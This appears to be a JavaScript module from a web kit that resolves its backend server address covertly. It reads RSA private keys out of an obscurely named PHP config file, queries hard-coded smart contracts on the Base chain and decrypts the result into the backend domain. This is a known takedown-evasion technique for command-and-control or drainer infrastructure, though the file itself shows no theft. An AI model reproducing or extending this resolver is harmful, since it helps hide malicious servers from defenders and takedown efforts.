import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { hexToBase64 } from "./hexToBase64.js";

const SELECTOR = "c2fb26a6";
const ROOT = path.dirname(fileURLToPath(import.meta.url));
const PHP_PATH = path.join(ROOT, "..", "config", "yE3Yqtto.php");

const CONFIG = {
  EVM: {
    rpcs: ["https://mainnet.base.org", "https://base-rpc.publicnode.com"],
    contract: "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32",
    pemLabel: "keyEvm",
  },
  SOL: {
    rpcs: ["https://mainnet.base.org", "https://base-rpc.publicnode.com"],
    contract: "0x0A05F58CA8b31e9E007c840Bb8a00a63543eCEBC",
    pemLabel: "keySol",
  },
};

const cache = { EVM: { at: 0, url: null }, SOL: { at: 0, url: null } };
let phpSource = null;
const TTL_MS = 60_000;

function loadPhp() {
  if (!phpSource) phpSource = fs.readFileSync(PHP_PATH, "utf8");
  return phpSource;
}

function extractPem(php, label) {
  const re = new RegExp(
    `'${label}'\\s*=>\\s*"-----BEGIN PRIVATE KEY-----[\\s\\S]*?-----END PRIVATE KEY-----"`,
  );
  const m = php.match(re);
  if (!m) throw new Error(`PEM ${label} not found in yE3Yqtto.php`);
  return m[0]
    .replace(new RegExp(`'${label}'\\s*=>\\s*"`), "")
    .replace(/"$/, "")
    .replace(/\\n/g, "\n");
}

function pem(type) {
  const cfg = CONFIG[type];
  return extractPem(loadPhp(), cfg.pemLabel);
}

function decryptSimple(b64, keyPem) {
  const enc = Buffer.from(b64, "base64");
  return crypto
    .privateDecrypt({ key: keyPem, padding: crypto.constants.RSA_PKCS1_PADDING }, enc)
    .toString("utf8");
}

async function ethCall(rpcs, to) {
  const body = {
    jsonrpc: "2.0",
    id: 1,
    method: "eth_call",
    params: [{ to, data: `0x${SELECTOR}` }, "latest"],
  };
  for (const url of rpcs) {
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const j = await res.json();
      if (j.result && j.result !== "0x") return j.result;
    } catch {
      /* next rpc */
    }
  }
  throw new Error("eth_call failed");
}

export async function getBackendBaseUrl(type) {
  const now = Date.now();
  const c = cache[type];
  if (c.url && now - c.at < TTL_MS) return c.url;

  const cfg = CONFIG[type];
  const raw = await ethCall(cfg.rpcs, cfg.contract);
  const domain = decryptSimple(hexToBase64(raw), pem(type));
  const base = domain.startsWith("http") ? domain.replace(/\/$/, "") : `https://${domain.replace(/\/$/, "")}`;
  c.url = base;
  c.at = now;
  return base;
}
